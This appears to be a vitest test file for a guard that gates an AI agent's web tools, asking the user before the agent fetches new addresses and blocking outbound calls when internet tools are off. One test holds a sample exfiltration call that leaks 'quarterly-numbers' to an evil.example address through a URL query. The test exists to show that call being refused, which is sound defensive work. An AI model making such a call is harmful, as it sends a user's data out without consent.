import { describe, expect, it, vi } from 'vitest'
import {
  ADDRESS_DECLINED,
  INTERNET_TOOLS_OFF,
  addressInConversation,
  fetchedAddresses,
  guardOutbound,
  type OutboundBridgeLike,
} from '../src/outbound-guard'
import type { AgentSkill } from '../src/skill'
import type { AgentMessage, AgentToolCall } from '../src/types'

const call = (name: string, input: Record<string, unknown> = {}): AgentToolCall => ({
  id: name,
  name,
  input,
})

const flush = () => new Promise((r) => setTimeout(r, 0))

function setup(opts: { on?: boolean; answer?: boolean } = {}) {
  let on = opts.on ?? true
  let history: AgentMessage[] = [{ role: 'user', text: 'Summarize https://example.com/a please' }]
  let changed: ((on: boolean) => void) | undefined
  const bridge: OutboundBridgeLike = {
    internetToolsEnabled: vi.fn(async () => on),
    onInternetToolsChanged: (listener) => {
      changed = listener
      return () => {}
    },
    confirmAddresses: vi.fn(async () => opts.answer ?? false),
  }
  const executed: string[] = []
  const editor: AgentSkill = {
    id: 'editor',
    systemPrompt: 'editor',
    tools: ['web_search', 'read_url', 'insert_image', 'edit_text'].map((name) => ({
      name,
      description: name,
      inputSchema: { type: 'object', properties: {} },
    })),
    executeTool: (c) => {
      executed.push(c.name)
      return { output: 'ok', summary: c.name }
    },
  }
  const skill = guardOutbound(editor, bridge, () => history)
  return {
    bridge,
    skill,
    executed,
    setOn: (v: boolean) => {
      on = v
      changed?.(v)
    },
    setHistory: (h: AgentMessage[]) => (history = h),
  }
}

describe('fetchedAddresses', () => {
  it('collects web addresses from address fields and media lists, nested, without repeats', () => {
    expect(
      fetchedAddresses({
        url: ' https://a.example/x ',
        mediaUrls: ['https://b.example/v.mp4', 'C:\\local.png', 'https://b.example/v.mp4'],
        shape: { src: 'http://c.example/i.png', imageUrl: 'attachment://logo.png' },
        text: 'https://not-fetched.example',
      }),
    ).toEqual(['https://a.example/x', 'https://b.example/v.mp4', 'http://c.example/i.png'])
  })
})

describe('addressInConversation', () => {
  it('counts the person’s messages and tool results, never the AI’s own text', () => {
    const history: AgentMessage[] = [
      { role: 'user', text: 'see https://u.example/1' },
      { role: 'assistant', text: 'I will read https://ai.example/2' },
      {
        role: 'tool',
        results: [{ id: 't', name: 'web_search', output: '1. x\n   https://s.example/3' }],
      },
    ]
    expect(addressInConversation('https://u.example/1', history)).toBe(true)
    expect(addressInConversation('https://s.example/3', history)).toBe(true)
    expect(addressInConversation('https://ai.example/2', history)).toBe(false)
  })
})

describe('guardOutbound', () => {
  it('returns the skill unchanged without a bridge', () => {
    const editor: AgentSkill = {
      id: 'e',
      systemPrompt: '',
      tools: [],
      executeTool: () => ({ output: '', summary: '' }),
    }
    expect(guardOutbound(editor, null, () => [])).toBe(editor)
  })

  it('drops the outbound tools and refuses outbound calls while the switch is off', async () => {
    const { skill, executed, setOn } = setup({ on: false })
    await flush()
    expect(skill.tools.map((t) => t.name)).toEqual(['insert_image', 'edit_text'])
    const res = await skill.executeTool(call('web_search', { query: 'q' }))
    expect(res).toMatchObject({ isError: true, output: INTERNET_TOOLS_OFF })
    // an address in an on-PC tool's input would still reach out
    const img = await skill.executeTool(call('insert_image', { src: 'https://x.example/i.png' }))
    expect(img).toMatchObject({ isError: true, output: INTERNET_TOOLS_OFF })
    expect(executed).toEqual([])
    setOn(true)
    expect(skill.tools.map((t) => t.name)).toContain('web_search')
  })

  it('runs on-PC calls directly, as they were', () => {
    const { skill, executed } = setup()
    expect(skill.executeTool(call('edit_text', { text: 'see https://x.example' }))).toEqual({
      output: 'ok',
      summary: 'edit_text',
    })
    expect(executed).toEqual(['edit_text'])
  })

  it('does not ask for searches or for an address already in the conversation', async () => {
    const { skill, bridge, executed } = setup()
    await skill.executeTool(call('web_search', { query: 'secret plans' }))
    await skill.executeTool(call('read_url', { url: 'https://example.com/a' }))
    expect(bridge.confirmAddresses).not.toHaveBeenCalled()
    expect(executed).toEqual(['web_search', 'read_url'])
  })

  it('asks before a new address and refuses it when the person says no', async () => {
    const { skill, bridge, executed } = setup({ answer: false })
    const res = await skill.executeTool(
      call('read_url', { url: 'https://evil.example/?d=quarterly-numbers' }),
    )
    expect(bridge.confirmAddresses).toHaveBeenCalledWith('read_url', [
      'https://evil.example/?d=quarterly-numbers',
    ])
    expect(res).toMatchObject({ isError: true, output: ADDRESS_DECLINED })
    expect(executed).toEqual([])
  })

  it('remembers an allowed address for this conversation only', async () => {
    const { skill, bridge, executed, setHistory } = setup({ answer: true })
    const url = 'https://new.example/page'
    await skill.executeTool(call('read_url', { url }))
    await skill.executeTool(call('read_url', { url }))
    expect(bridge.confirmAddresses).toHaveBeenCalledTimes(1)
    expect(executed).toEqual(['read_url', 'read_url'])
    setHistory([{ role: 'user', text: 'a new chat' }])
    await skill.executeTool(call('read_url', { url }))
    expect(bridge.confirmAddresses).toHaveBeenCalledTimes(2)
  })

  it('refuses when the question cannot be put to the person', async () => {
    const { skill, bridge } = setup()
    vi.mocked(bridge.confirmAddresses).mockRejectedValueOnce(new Error('window gone'))
    const res = await skill.executeTool(call('read_url', { url: 'https://new.example/' }))
    expect(res).toMatchObject({ isError: true, output: ADDRESS_DECLINED })
  })
})
